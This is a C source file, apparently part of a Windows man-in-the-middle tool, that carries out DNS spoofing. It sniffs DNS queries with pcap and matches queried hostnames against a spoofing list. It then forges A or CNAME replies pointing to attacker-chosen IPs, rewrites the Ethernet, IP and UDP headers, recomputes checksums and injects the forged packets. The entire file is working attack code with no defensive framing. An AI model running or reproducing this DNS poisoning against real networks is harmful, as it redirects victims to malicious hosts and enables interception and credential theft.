#include <stdio.h>
#include <pcap.h>
#include <excpt.h>
#include <Windows.h>

#include "APE.h"
#include "DnsForge.h"
#include "DnsHelper.h"
#include "DnsRequestSpoofing.h"
#include "DnsStructs.h"
#include "LinkedListSpoofedDNSHosts.h"
#include "Logging.h"
#include "NetworkHelperFunctions.h"

extern PHOSTNODE gDnsSpoofingList;


BOOL DnsRequestSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, PHOSTNODE spoofingRecord, char *srcIp, char *dstIp)
{
  BOOL retVal = FALSE;
  unsigned char *spoofedDnsResponse = NULL;
  int basePacketSize = sizeof(ETHDR) + sizeof(IPHDR) + sizeof(UDPHDR);
  PDNS_HEADER dnsBasicHdr = (PDNS_HEADER) (rawPacket + basePacketSize);
  PRAW_DNS_DATA responseData = NULL;
  int counter = 0;
  char errbuf[PCAP_ERRBUF_SIZE];
  
  // Create DNS response data block
  if (spoofingRecord->Data.Type == RESP_A)
  {
    responseData = CreateDnsResponse_A(spoofingRecord->Data.HostName, dnsBasicHdr->id, spoofingRecord->Data.SpoofedIp);
  }
  else if (spoofingRecord->Data.Type == RESP_CNAME)
  {
    responseData = CreateDnsResponse_CNAME(spoofingRecord->Data.HostName, dnsBasicHdr->id, spoofingRecord->Data.CnameHost, spoofingRecord->Data.SpoofedIp);
  }

  if (responseData == NULL)
  {
    retVal = FALSE;
    goto END;
  }

  if ((spoofedDnsResponse = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, basePacketSize + responseData->dataLength)) == NULL)
  {
    retVal = FALSE;
    goto END;
  }

  CopyMemory(spoofedDnsResponse, rawPacket, basePacketSize);
  CopyMemory(spoofedDnsResponse + basePacketSize, responseData->data, responseData->dataLength);

  // Adjust and prepare data on OSI layer 2 to 4
  FixNetworkLayerData4Request(spoofedDnsResponse, responseData);

  // Keep sending the crafted dns reply packet to client till max 5 times if not successful
  for (counter = 5; counter > 0; counter--) 
  {
    int funcRetVal = -2;
    if ((funcRetVal = pcap_sendpacket(deviceHandle, (unsigned char *)spoofedDnsResponse, basePacketSize + responseData->dataLength)) != 0)
    {
      LogMsg(DBG_HIGH, "%2d Request DNS poisoning failed (%d) : %s -> %s, deviceHandle=0x%08x",
        counter, funcRetVal, spoofingRecord->Data.HostName, spoofingRecord->Data.SpoofedIp, deviceHandle);
      retVal = FALSE;
    }
    else 
    {
      retVal = TRUE;
      break;
    }
  }

END:
  if (spoofedDnsResponse != NULL)
  {
    HeapFree(GetProcessHeap(), 0, spoofedDnsResponse);
  }

  if (responseData != NULL && responseData->data != NULL)
  {
    HeapFree(GetProcessHeap(), 0, responseData->data);
  }

  return retVal;
}


void FixNetworkLayerData4Request(unsigned char * data, PRAW_DNS_DATA responseData)
{
  int etherPacketSize = sizeof(ETHDR);
  int ipPacketSize = sizeof(IPHDR);
  int udpPacketSize = sizeof(UDPHDR);
  PETHDR ethrHdr = (PETHDR)data;
  PIPHDR ipHdr = (PIPHDR)(data + etherPacketSize);
  PUDPHDR udpHdr = (PUDPHDR)(data + etherPacketSize + ipPacketSize);
  PDNS_HEADER dnsBasicHdr = NULL;
  unsigned short dstPort = 0;
  unsigned short srcPort = 0;
  unsigned char dstMacBin[BIN_MAC_LEN];
  unsigned char srcMacBin[BIN_MAC_LEN];
  unsigned char srcIpBin[BIN_IP_LEN];
  unsigned char dstIpBin[BIN_IP_LEN];
  char srcIpStr[128];
  char dstIpStr[128];
  PUDP_PSEUDO_HDR udpPseudoHdr;
  int basePacketSize = etherPacketSize + ipPacketSize + udpPacketSize;

  // 1. Copy source and destination MAC addresses
  CopyMemory(dstMacBin, ethrHdr->ether_dhost, BIN_MAC_LEN);
  CopyMemory(srcMacBin, ethrHdr->ether_shost, BIN_MAC_LEN);

  // 2. Copy source and destination IP addresses  
  CopyMemory(dstIpBin, &ipHdr->daddr, BIN_IP_LEN);
  CopyMemory(srcIpBin, &ipHdr->saddr, BIN_IP_LEN);

  // 3. Copy src(client) and dest(dns server) port  
  dstPort = udpHdr->dport;	
  srcPort = udpHdr->sport;
  dnsBasicHdr = (PDNS_HEADER)(data + basePacketSize);
  
  // 4. Adjust OSI layer 2 to 4
  ethrHdr = (PETHDR)data;
  ipHdr = (PIPHDR)(data + etherPacketSize);
  udpHdr = (PUDPHDR)(data + etherPacketSize + ipPacketSize);

  CopyMemory(ethrHdr->ether_dhost, srcMacBin, BIN_MAC_LEN);
  CopyMemory(ethrHdr->ether_shost, dstMacBin, BIN_MAC_LEN);

  CopyMemory(&ipHdr->daddr, &srcIpBin, BIN_IP_LEN);
  CopyMemory(&ipHdr->saddr, &dstIpBin, BIN_IP_LEN);

  CopyMemory(&udpHdr->sport, &dstPort, sizeof(dstPort));
  CopyMemory(&udpHdr->dport, &srcPort, sizeof(srcPort));

  int ipPayloadSize = sizeof(IPHDR) + sizeof(UDPHDR) + responseData->dataLength; 

  // IP header 
  ipHdr->identification = htons((unsigned short)GetCurrentProcessId()); //packet identification=process ID
  ipHdr->ver_ihl = 0x45;	//version of IP header = 4
  ipHdr->tos = 0x00;		//type of service
  ipHdr->flags_fo = htons(0x0000);
  ipHdr->ttl = 0xff; 	//time to live  
  ipHdr->tlen = htons(ipPayloadSize);
  ipHdr->checksum = 0;
  ipHdr->checksum = in_cksum((u_short *)ipHdr, ipPacketSize);

  // UDP header
  udpHdr->ulen = htons(sizeof(UDPHDR) + responseData->dataLength);
  udpHdr->checksum = 0;

  // UDP pseudo header checksum calculation
  char tempDataBuffer[512];
  ZeroMemory(&tempDataBuffer, sizeof(tempDataBuffer));
  CopyMemory(tempDataBuffer + sizeof(UDP_PSEUDO_HDR), (unsigned char *)udpHdr, sizeof(UDPHDR) + responseData->dataLength);  
  udpPseudoHdr = (PUDP_PSEUDO_HDR)tempDataBuffer;

  udpPseudoHdr->saddr = ipHdr->saddr;
  udpPseudoHdr->daddr = ipHdr->daddr;
  udpPseudoHdr->unused = 0;
  udpPseudoHdr->protocol = IP_PROTO_UDP;
  udpPseudoHdr->udplen = htons(sizeof(UDPHDR) + responseData->dataLength);

  // UDP header checksum
  udpHdr->checksum = in_cksum((unsigned short *) udpPseudoHdr, udpPacketSize + responseData->dataLength + sizeof(UDP_PSEUDO_HDR));
  
  ZeroMemory(srcIpStr, sizeof(srcIpStr));
  ZeroMemory(dstIpStr, sizeof(dstIpStr));
  snprintf((char *)srcIpStr, sizeof(srcIpStr) - 1, "%i.%i.%i.%i", srcIpBin[0], srcIpBin[1], srcIpBin[2], srcIpBin[3]);
  snprintf((char *)dstIpStr, sizeof(dstIpStr) - 1, "%i.%i.%i.%i", dstIpBin[0], dstIpBin[1], dstIpBin[2], dstIpBin[3]);
  LogMsg(DBG_LOW, "FixNetworkLayerData4Request(): %s:%d -> %s:%d udpDataLength=%d",
    srcIpStr, ntohs(srcPort), dstIpStr, ntohs(dstPort), ntohs(udpHdr->ulen));
}


void *DnsRequestPoisonerGetHost2Spoof(u_char *dataParam)
{
  PETHDR ethrHdr = (PETHDR)dataParam;
  PIPHDR ipHdr = NULL;
  PUDPHDR updHdr = NULL;
  int ipHdrLen = 0;
  char *data = NULL;
  char *dnsData = NULL;
  PHOSTNODE retVal = NULL;
  PHOSTNODE tmpNode = NULL;
  PDNS_HEADER dnsHdr = NULL;
  unsigned char *reader = NULL;
  int stop;
  unsigned char *peerName = NULL;

  if (gDnsSpoofingList->next == NULL || 
      ethrHdr == NULL || 
      htons(ethrHdr->ether_type) != ETHERTYPE_IP)
  {
    goto END;
  }

  ipHdr = (PIPHDR)(dataParam + sizeof(ETHDR));
  if (ipHdr == NULL || 
      ipHdr->proto != IP_PROTO_UDP)
  {
    goto END;
  }

  ipHdrLen = (ipHdr->ver_ihl & 0xf) * 4;
  if (ipHdrLen <= 0)
  {
    goto END;
  }

  updHdr = (PUDPHDR)((unsigned char*)ipHdr + ipHdrLen);
  if (updHdr == NULL ||
      updHdr->ulen <= 0 ||
      ntohs(updHdr->dport) != 53)
  {
    goto END;
  }

  dnsData = ((char*)updHdr + sizeof(UDPHDR));
  if ((dnsHdr = (PDNS_HEADER)&dnsData[sizeof(DNS_HEADER)]) == NULL)
  {
    goto END;
  }

  if (ntohs(dnsHdr->q_count) <= 0)
  {
    goto END;
  }

  stop = 0;
  reader = (unsigned char *)&dnsData[sizeof(DNS_HEADER)];
  if ((peerName = ChangeDnsNameToTextFormat(reader, (unsigned char *)dnsHdr, &stop)) == NULL)
  {
    goto END;
  }

  if ((tmpNode = GetNodeByHostname(gDnsSpoofingList, peerName)) != NULL)
  {
    retVal = tmpNode;
  }

END:
  if (tmpNode != NULL)
  {
    HeapFree(GetProcessHeap(), 0, peerName);
  }

  return retVal;
}
